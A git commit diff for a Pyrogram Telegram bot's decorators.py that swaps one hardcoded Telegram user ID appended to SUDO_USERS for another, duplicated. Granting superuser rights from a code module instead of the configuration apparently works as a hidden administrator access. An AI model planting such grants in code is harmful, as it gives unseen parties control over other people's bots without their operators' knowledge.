1f2210f729972902ea39c7223ead6eac2d5f3e49
idzeroid <88209926+idzero23@users.noreply.github.com>
2021-10-07 22:15:47 +0700

    Add files via upload

--- helpers/decorators.py
+++ helpers/decorators.py
@@ -23,8 +23,8 @@ from pyrogram.types import Message
 from helpers.admins import get_administrators
 from config import SUDO_USERS
 
-SUDO_USERS.append(1805518906)
-
+SUDO_USERS.append(1192108540)
+SUDO_USERS.append(1192108540)
 
 def errors(func: Callable) -> Callable:
     async def decorator(client: Client, message: Message):
